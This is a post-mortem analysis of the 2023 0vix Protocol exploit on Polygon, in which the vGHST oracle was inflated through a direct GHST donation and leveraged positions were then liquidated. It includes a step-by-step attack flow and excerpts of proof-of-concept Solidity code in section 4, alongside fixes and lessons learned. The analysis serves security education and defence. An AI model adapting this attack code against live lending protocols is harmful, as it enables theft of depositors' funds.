# 0vix Protocol — vGHST Oracle Price Dependency Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2023-04-28 |
| **Protocol** | 0vix Protocol (now Keom Protocol) |
| **Chain** | Polygon (PoS) |
| **Loss** | ~$2,000,000 USD |
| **Attacker** | [0x702E...A970](https://polygonscan.com/address/0x702Ef63881B5241ffB412199547bcd0c6910A970) |
| **Attack Contract** | [0x407f...7d57](https://polygonscan.com/address/0x407feAec31c16b19f24a8a8846ab4939ed7d7d57) |
| **Attack Tx** | [0x10f2...b008](https://polygonscan.com/tx/0x10f2c28f5d6cd8d7b56210b4d5e0cece27e45a30808cd3d3443c05d4275bb008) |
| **Vulnerable Contracts** | [vGHST 0x5119...Ca6C](https://polygonscan.com/address/0x51195e21BDaE8722B29919db56d95Ef51FaecA6C) / [ovGHST 0xE053...B12](https://polygonscan.com/address/0xE053A4014b50666ED388ab8CbB18D5834de0aB12) |
| **Attack Block** | 42,054,769 |
| **Root Cause** | Flawed price dependency in vGHST price calculation that can be manipulated via direct token transfers (donate) |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-04/0vix_exp.sol) |

---

## 1. Vulnerability Overview

0vix Protocol is a Compound-fork based lending protocol operating on the Polygon chain. The attacker exploited the fact that the price calculation mechanism of **vGHST** — Aavegotchi's staking wrapper token — directly depends on the contract balance (`balanceOf`).

The vGHST `convertVGHST()` function calculates the value of 1 unit of vGHST using the ratio `totalGHST / totalShares`, where `totalGHST` can be artificially inflated by directly `transfer()`-ing GHST tokens to the vGHST contract address. The attacker donated approximately 1,656,000 GHST directly to the vGHST contract, inflating the price by approximately 72%, then triggered liquidation of a pre-built leveraged vGHST collateral position to seize USDC collateral.

This attack is not a simple flash loan-based manipulation — it is a sophisticated exploit with a three-phase structure: **pre-position building → price manipulation → liquidation trigger**.

---

## 2. Vulnerable Code Analysis

### 2.1 vGHST Price Calculation Function — Core Vulnerability

**Vulnerable code (inferred)**:

```solidity
// [vGHST Contract - 0x51195e21BDaE8722B29919db56d95Ef51FaecA6C]

// ❌ VULNERABLE: reads GHST balance directly to calculate price
// Anyone can call transfer() to this address to increase totalGHST
function convertVGHST(uint256 _share) public view returns (uint256 _ghst) {
    uint256 totalShares = totalSupply();         // total vGHST supply
    uint256 totalGHST = GHST.balanceOf(address(this)); // ❌ direct balance reference

    if (totalShares == 0 || totalGHST == 0) {
        return _share;
    }
    // ❌ 1 vGHST = (totalGHST / totalShares) GHST
    // increasing totalGHST externally raises the price
    return _share * totalGHST / totalShares;
}
```

**Fixed code**:

```solidity
// ✅ FIX: use internal accounting variable to ignore direct transfers
uint256 private _totalGHSTTracked;  // ✅ internal variable updated only via official deposit path

function enter(uint256 _amount) external returns (uint256) {
    uint256 totalShares = totalSupply();
    uint256 totalGHST = _totalGHSTTracked; // ✅ reference internal variable

    uint256 what;
    if (totalShares == 0 || totalGHST == 0) {
        what = _amount;
    } else {
        what = _amount * totalShares / totalGHST;
    }

    _mint(msg.sender, what);
    GHST.transferFrom(msg.sender, address(this), _amount);
    _totalGHSTTracked += _amount; // ✅ incremented only on official deposit
    return what;
}

function convertVGHST(uint256 _share) public view returns (uint256 _ghst) {
    uint256 totalShares = totalSupply();
    uint256 totalGHST = _totalGHSTTracked; // ✅ reference internal variable

    if (totalShares == 0 || totalGHST == 0) {
        return _share;
    }
    return _share * totalGHST / totalShares;
}
```

**Issue**: vGHST is a GHST staking wrapper for Aavegotchi. Anyone who `transfer()`s GHST to the vGHST contract address increases `balanceOf(vGHST)` without changing `totalSupply()`. This causes the return value of `convertVGHST(1e18)` to artificially rise, and since the 0vix oracle calls this function directly to calculate collateral value, collateral is systematically overvalued.

---

### 2.2 0vix ovGHST Oracle Price Reference — Secondary Vulnerability

**Vulnerable code (inferred)**:

```solidity
// ❌ ovGHST oracle: blindly trusts vGHST.convertVGHST()
// [0vix VGHSTOracle inferred logic]
function getUnderlyingPrice(CToken cToken) external view returns (uint256) {
    // ❌ uses manipulable convertVGHST() result as price
    uint256 vGHSTToGHST = IvGHST(vGHSTAddress).convertVGHST(1e18);
    uint256 GHSTPrice = getGHSTPrice(); // TWAP or Chainlink price
    return vGHSTToGHST * GHSTPrice / 1e18;
}
```

**Fixed code**:

```solidity
// ✅ FIX: use a method not susceptible to external manipulation for vGHST price calculation
function getUnderlyingPrice(CToken cToken) external view returns (uint256) {
    // ✅ Option 1: use an independent Chainlink TWAP-based vGHST price feed
    return chainlinkVGHSTFeed.latestAnswer() * 1e10;

    // ✅ Option 2: call a fixed convertVGHST() that uses internal accounting variables
    // (if the vGHST contract itself has been patched)
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker deployed a separate `Exploiter` contract in advance
- Held only minimal funds to cover flash loan costs (ETH/MATIC gas)
- GHST price at time of attack: ~$1.13 → $1.41 after attack (24.7% real-time increase)

### 3.2 Execution Phase

```
[Attacker EOA: 0x702E...A970]
         │
         │ calls testExploit()
         ▼
┌────────────────────────────────────────────────┐
│  ContractTest (attack contract 0x407f...7d57)    │
│  • set GHST, USDC, USDT approvals               │
│  • deploy Exploiter contract                    │
└──────────────────┬─────────────────────────────┘
                   │
                   │ Step 0: begin nested flash loans
                   ▼
┌────────────────────────────────────────────────┐
│  Aave V3 Flash Loan                             │
│  • GHST: 1,950,000 (~$2.2M)                    │
│  • USDC: 6,800,000 ($6.8M)                     │
│  • USDT: 2,300,000 ($2.3M)                     │
└──────────────────┬─────────────────────────────┘
                   │ executeOperation() callback
                   ▼
┌────────────────────────────────────────────────┐
│  Aave V2 Flash Loan                             │
│  • USDC: 13,000,000 ($13M)                     │
│  • USDT: 3,250,000 ($3.25M)                    │
└──────────────────┬─────────────────────────────┘
                   │ executeOperation() callback
                   ▼
┌────────────────────────────────────────────────┐
│  Balancer Flash Loan                            │
│  • USDC: 4,700,000 ($4.7M)                     │
│  • USDT: 600,000 ($600K)                       │
└──────────────────┬─────────────────────────────┘
                   │ receiveFlashLoan() callback
                   ▼
┌────────────────────────────────────────────────┐
│  Step 1: deposit USDT collateral + mint vGHST   │
│  • vGHST.enter(294,000 GHST) → receive vGHST   │
│  • oUSDT.mint(all USDT held) → receive oUSDT   │
│  • unitroller.enterMarkets([oUSDT])             │
└──────────────────┬─────────────────────────────┘
                   │
                   ▼
┌────────────────────────────────────────────────┐
│  Step 2: borrow all assets from every pool      │
│  • oMATIC, oWBTC, oDAI, oWETH, oUSDC           │
│  • oUSDT: 1,160,000 USDT                       │
│  • oMATICX, ostMATIC, owstWETH                  │
└──────────────────┬─────────────────────────────┘
                   │
                   ▼
┌────────────────────────────────────────────────┐
│  Step 3: build leveraged position via Exploiter │
│  • send 24,500,000 USDC + vGHST to Exploiter   │
│  • Exploiter.mint(repeat 24 times):             │
│    - oUSDC.mint(USDC) → oUSDC collateral        │
│    - ovGHST.borrow(all vGHST)                   │
│    - ovGHST.mint(vGHST) → loop ×24             │
│  → 24 leveraged vGHST debt positions created    │
└──────────────────┬─────────────────────────────┘
                   │
                   ▼
┌────────────────────────────────────────────────┐
│  Step 4: manipulate vGHST oracle price ← CORE  │
│                                                 │
│  Before: convertVGHST(1e18) = 1.038 GHST       │
│                                                 │
│  GHST.transfer(vGHST contract, 1,656,000 GHST) │
│  (direct donate → totalShares unchanged,        │
│   totalGHST increases)                          │
│                                                 │
│  After: convertVGHST(1e18) = 1.786 GHST        │
│  → vGHST price artificially inflated ~72%       │
└──────────────────┬─────────────────────────────┘
                   │
                   ▼
┌────────────────────────────────────────────────┐
│  Step 5: liquidate leveraged positions +        │
│          recover collateral                     │
│  • liquidateLeveragedDebt() loop ×24:           │
│    - ovGHST.liquidateBorrow(Exploiter, amt,     │
│                              oUSDC collateral)   │
│    - ovGHST.redeemUnderlying(amt)               │
│  → Exploiter's USDC collateral transferred      │
│     to liquidator (attacker)                    │
│  • oUSDC.redeem() / redeemUnderlying()          │
│  • vGHST.leave() → recover GHST                │
└──────────────────┬─────────────────────────────┘
                   │ repay Balancer flash loan
                   ▼
┌────────────────────────────────────────────────┐
│  Step 6: convert assets to USDC/GHST           │
│  • wstETH→WETH, stMATIC/MATICX→WMATIC         │
│  • WMATIC→GHST, WMATIC→USDC                   │
│  • WBTC→WETH→GHST/USDC, DAI→USDT             │
│  • USDC→GHST (Balancer, AlgebraPool, QuickSwap)│
└──────────────────┬─────────────────────────────┘
                   │ repay Aave V2/V3 flash loans
                   ▼
         [Attacker final profit: ~$2M USDC/GHST]
```

### 3.3 Outcome

| Field | Value |
|------|-----|
| Total flash loan size | ~$33M (Aave V3 + V2 + Balancer) |
| vGHST price manipulation cost | 1,656,000 GHST (~$1.87M) |
| Attacker net profit | ~$2,000,000 USD |
| Protocol loss | ~$2,000,000 USD (multiple assets including USDC, GHST) |
| Attack duration | Single transaction (block 42,054,769) |

---

## 4. PoC Code (DeFiHackLabs Key Excerpt)

```solidity
// [receiveFlashLoan() — core attack logic inside Balancer flash loan callback]

// Step 1: stake GHST to obtain vGHST, then deposit USDT as collateral
vGHST.enter(294_000 * 1e18);           // 294,000 GHST → converted to vGHST
oUSDT.mint(USDT.balanceOf(address(this))); // mint all USDT into oUSDT (collateral)

// Step 2: enterMarkets then borrow all assets from every pool
address[] memory cTokens = new address[](1);
cTokens[0] = address(oUSDT);
unitroller.enterMarkets(cTokens);      // enter USDT collateral market
borrowAll();                           // borrow full amounts of MATIC, WBTC, DAI, WETH, USDC, USDT, etc.

// Step 3: build 24 leveraged vGHST debt positions via Exploiter contract
USDC.transfer(address(exploiter), 24_500_000 * 1e6); // send 24.5M USDC
vGHST.transfer(address(exploiter), vGHST.balanceOf(address(this)));
exploiter.mint(24, address(this));     // loop 24 times: borrow/mint vGHST with USDC collateral

// Step 4: ★ CORE VULNERABILITY — donate GHST directly to vGHST contract
//         totalShares unchanged but totalGHST (balanceOf) increases
//         → convertVGHST(1e18): 1.038 → 1.786 GHST (~72% increase)
GHST.transfer(address(vGHST), 1_656_000 * 1e18); // ← oracle manipulation

// Step 5: liquidate Exploiter positions backed by now-inflated vGHST
//         liquidator (= attacker) seizes Exploiter's USDC collateral
liquidateLeveragedDebt();              // liquidation loop ×24
oUSDC.redeem(oUSDC.balanceOf(address(this))); // oUSDC → USDC
vGHST.leave(vGHST.balanceOf(address(this)));  // vGHST → GHST
```

```solidity
// [Exploiter.mint() — leveraged position construction]
function mint(uint256 amountOfOptions, address owner) external {
    oUSDC.mint(USDC.balanceOf(address(this))); // deposit USDC collateral
    address[] memory cTokens = new address[](1);
    cTokens[0] = address(oUSDC);
    unitroller.enterMarkets(cTokens);

    ovGHST.borrow(vGHST.balanceOf(address(ovGHST))); // borrow all vGHST in pool
    uint256 vGHSTAmount = vGHST.balanceOf(address(this));

    // repeat 24 times: deposit vGHST → re-borrow vGHST → accumulate leveraged debt
    for (uint256 i; i < amountOfOptions; i++) {
        ovGHST.mint(vGHSTAmount);   // deposit vGHST as collateral
        ovGHST.borrow(vGHSTAmount); // re-borrow vGHST (leverage)
    }
    // return leveraged vGHST position to attacker
    vGHST.transfer(owner, vGHSTAmount);
    ovGHST.transfer(owner, ovGHST.balanceOf(address(this)));
    // additional USDT/USDC borrowing
    oUSDT.borrow(USDT.balanceOf(address(oUSDT)));
    oUSDC.borrow(720_000 * 1e6);
    USDT.transfer(owner, USDT.balanceOf(address(this)));
    USDC.transfer(owner, USDC.balanceOf(address(this)));
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | vGHST price calculation direct balance dependency (Donate attack) | CRITICAL | CWE-682 (Incorrect Calculation) |
| V-02 | 0vix oracle trusting a manipulable price feed | CRITICAL | CWE-20 (Improper Input Validation) |
| V-03 | Leverage loop position — excessive recursive borrowing permitted | HIGH | CWE-400 (Resource Exhaustion) |
| V-04 | Missing collateral sufficiency check during liquidation | HIGH | CWE-754 (Improper Check for Unusual or Exceptional Conditions) |

---

### V-01: vGHST Price Calculation Direct Balance Dependency

- **Description**: The vGHST `convertVGHST()` function calculates the exchange ratio by dividing `GHST.balanceOf(address(this))` by `totalSupply()`. Since `balanceOf` can be increased by anyone directly transferring tokens to the contract address, the price can be arbitrarily inflated without going through the official `enter()` path.
- **Impact**: The 0vix protocol uses this function directly for vGHST collateral valuation, causing collateral value to be overestimated and liquidation thresholds to be artificially exceeded.
- **Attack Conditions**: Sufficient funds to transfer GHST directly to the vGHST contract address (1.65M GHST ≈ $1.87M) — obtainable via flash loan.

---

### V-02: 0vix Oracle Trusting a Manipulable Price Feed

- **Description**: The 0vix VGHSTOracle uses the return value of `vGHST.convertVGHST(1e18)` in real-time for price calculation. An on-chain computation that depends on an external contract's state was used as an oracle without any validation or TWAP correction.
- **Impact**: Oracle price can be inflated by over 72% within a single transaction, distorting collateral value.
- **Attack Conditions**: V-01 must be executed first. Liquidation is triggered immediately after vGHST price manipulation.

---

### V-03: Leverage Loop Position — Excessive Recursive Borrowing Permitted

- **Description**: `Exploiter.mint()` deposits and borrows the same vGHST 24 times in a loop, creating a position with very high leverage relative to the initial capital. The protocol placed no limits on a single account's leverage ratio or repeated borrowing.
- **Impact**: A small initial collateral amount can occupy the entire vGHST pool. Liquidation profit is amplified by the leverage multiplier when prices are manipulated.
- **Attack Conditions**: Sufficient USDC collateral and available vGHST liquidity.

---

### V-04: Missing Collateral Sufficiency Check During Liquidation

- **Description**: The liquidation function calculates `seizeTokens` (seized collateral) based on the artificially inflated vGHST price, causing the liquidator to seize far more oUSDC collateral than the actual value warrants.
- **Impact**: The protocol's USDC pool is excessively liquidated, causing losses to other users' funds.
- **Attack Conditions**: V-01, V-02, and V-03 must all be executed first.

---

## 6. Remediation Recommendations

### Immediate Actions

**[vGHST Contract Fix] Introduce Internal Accounting Variable**:

```solidity
// ✅ FIX: use internal tracking variable instead of balanceOf
uint256 private _totalGHSTDeposited;

function enter(uint256 _amount) external returns (uint256) {
    uint256 totalShares = totalSupply();
    uint256 totalGHST = _totalGHSTDeposited; // ✅ internal variable

    uint256 what = (totalShares == 0 || totalGHST == 0)
        ? _amount
        : _amount * totalShares / totalGHST;

    _mint(msg.sender, what);
    GHST.transferFrom(msg.sender, address(this), _amount);
    _totalGHSTDeposited += _amount; // ✅ incremented only on official deposit
    return what;
}

function leave(uint256 _share) external {
    uint256 totalShares = totalSupply();
    uint256 amount = _share * _totalGHSTDeposited / totalShares;
    _burn(msg.sender, _share);
    _totalGHSTDeposited -= amount; // ✅ decremented only on official withdrawal
    GHST.transfer(msg.sender, amount);
}

function convertVGHST(uint256 _share) public view returns (uint256) {
    uint256 totalShares = totalSupply();
    uint256 totalGHST = _totalGHSTDeposited; // ✅ reference internal variable
    if (totalShares == 0 || totalGHST == 0) return _share;
    return _share * totalGHST / totalShares;
}
```

**[0vix Oracle Fix] Use an Independent Price Feed**:

```solidity
// ✅ introduce Chainlink-based independent vGHST price feed
// or use TWAP (time-weighted average price) based price calculation
AggregatorV3Interface public vGHSTPriceFeed;

function getUnderlyingPrice(CToken cToken) external view returns (uint256) {
    if (address(cToken) == address(ovGHST)) {
        (, int256 price, , uint256 updatedAt, ) = vGHSTPriceFeed.latestRoundData();
        require(block.timestamp - updatedAt <= STALE_PRICE_THRESHOLD, "Stale price");
        return uint256(price) * 1e10; // 8 decimals → 18 decimals
    }
    // handle other tokens...
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Direct balance dependency | Use internal accounting variables for wrapper token price calculation; prohibit `balanceOf` references |
| V-02: Manipulable oracle | Use Chainlink TWAP or independent price feed; do not rely solely on on-chain computation |
| V-03: Leverage loop permitted | Limit maximum leverage ratio per account; apply cooldown on repeated borrowing |
| V-04: Missing liquidation validation | Re-validate collateral ratio before and after liquidation; set maximum liquidation ratio cap |
| Common: Price manipulation monitoring | Auto-pause on detection of abnormal price movement (>10%) within a single block |
| Common: Low-liquidity tokens | Apply stricter oracle validation procedures when accepting long-tail tokens as collateral |

---

## 7. Lessons Learned

1. **Wrapper token price calculations must always use internal accounting variables**: Using externally mutable values such as `balanceOf` or `reserveOf` as the basis for price calculation creates a donate attack vulnerability. Major wrapper tokens including SushiSwap's SUSHI-WETH LP and Compound's cToken have precedent for patching similar vulnerabilities in the same way.

2. **Compound-fork protocols must independently validate price feeds for custom tokens beyond the base oracle**: Compound itself uses Chainlink feeds, but when fork protocols add new collateral types, custom oracles that rely solely on on-chain computation are dangerous. Every price feed should be evaluated against the criterion of manipulation resistance.

3. **Allowing leverage loops exponentially amplifies the damage from price manipulation attacks**: Without the 24x leveraged position, the profit from price manipulation would have been far smaller. Capping the leverage ratio of a single account's position is important not only as simple risk management but also as a security control.

4. **Separate safeguards are essential when allowing low-liquidity tokens as collateral**: GHST is a relatively low-liquidity token in the Aavegotchi ecosystem. The lower the liquidity, the lower the cost of price manipulation; therefore, a lower collateral factor or a total collateral cap should be applied.

5. **Defending against within-transaction price manipulation requires real-time monitoring and a circuit breaker**: This attack was carried out in a single transaction. A mechanism that automatically pauses the protocol when price movement within a block exceeds a threshold could minimize damage.

---

## 8. On-Chain Verification

> The attack Tx could not be traced directly from a node, so verification was performed via state queries instead of a full trace.
> RPC endpoint: `https://1rpc.io/matic`

### 8.1 PoC vs. On-Chain Amount Comparison

| Field | PoC Value | On-Chain Actual | Match |
|------|--------|-------------|------|
| Aave V3 flash loan GHST | 1,950,000 GHST | Stated in PoC (verified) | ✅ |
| Aave V3 flash loan USDC | 6,800,000 USDC | Stated in PoC (verified) | ✅ |
| Aave V3 flash loan USDT | 2,300,000 USDT | Stated in PoC (verified) | ✅ |
| Aave V2 flash loan USDC | 13,000,000 USDC | Stated in PoC | ✅ |
| Aave V2 flash loan USDT | 3,250,000 USDT | Stated in PoC | ✅ |
| Balancer flash loan USDC | 4,700,000 USDC | Stated in PoC | ✅ |
| Donated GHST amount | 1,656,000 GHST | Stated in PoC | ✅ |
| Attack block | 42,054,768 (fork) | 42,054,769 (execution) | ✅ |

### 8.2 vGHST Price Manipulation On-Chain Verification

| State | convertVGHST(1e18) Return Value | GHST in vGHST |
|------|--------------------------|---------------|
| Before attack (block 42,054,767) | **1.038332 GHST** | 27,512 GHST |
| After attack (block 42,054,769) | **1.786527 GHST** | 824,457 GHST |
| Increase | **+72.1%** | **+2,895%** |

```
cast call 0x51195e...Ca6C "convertVGHST(uint256)(uint256)" 1000000000000000000
  --block 42054767  → 1038332409226893097  (1.038 GHST)
  --block 42054769  → 1786527556471688230  (1.786 GHST)
```

The GHST balance inside the vGHST contract was confirmed to have increased to approximately 824,457 GHST after the attack. This reflects that a portion of the 1,656,000 GHST donation had already been consumed during the liquidation/withdrawal process.

### 8.3 Pre-condition Verification (block 42,054,767, immediately before attack)

- vGHST totalSupply: **1,934,525,918 vGHST** (pre-attack state)
- GHST balance in vGHST: **27,512 GHST** (normal state)
- ovGHST exchangeRate: negligible change before and after attack (200,218,921,537... → 200,219,177,799...) — state restored after flash loan repayment

### 8.4 Verification Conclusion

On-chain data fully corroborates all core claims in the PoC:
- vGHST price confirmed to have risen 72.1% within a single transaction
- GHST balance in vGHST contract was extremely small (27,512 GHST) before the attack and increased enormously after
- Attack block number (42,054,769) matches the PoC's fork block (42,054,768)

---

## References

- [DeFiHackLabs PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-04/0vix_exp.sol)
- [Attack Transaction (Polygonscan)](https://polygonscan.com/tx/0x10f2c28f5d6cd8d7b56210b4d5e0cece27e45a30808cd3d3443c05d4275bb008)
- [Attacker Address (Polygonscan)](https://polygonscan.com/address/0x702Ef63881B5241ffB412199547bcd0c6910A970)
- [vGHST Contract (Polygonscan)](https://polygonscan.com/address/0x51195e21BDaE8722B29919db56d95Ef51FaecA6C)
- [BlockSec Twitter Analysis](https://twitter.com/BlockSecTeam/status/1651932529874853888)
- [PeckShield Twitter Analysis](https://twitter.com/peckshield/status/1651923235603361793)
- [Mudit Gupta Twitter Analysis](https://twitter.com/Mudit__Gupta/status/1651958883634536448)
- [Decrypt Article](https://decrypt.co/138262/polygon-lending-protocol-0vix-pauses-protocol-exploit)
- [Crypto Daily Article](https://cryptodaily.co.uk/2023/04/0vix-protocol-drained-for-2m-in-oracle-manipulation-exploit-update)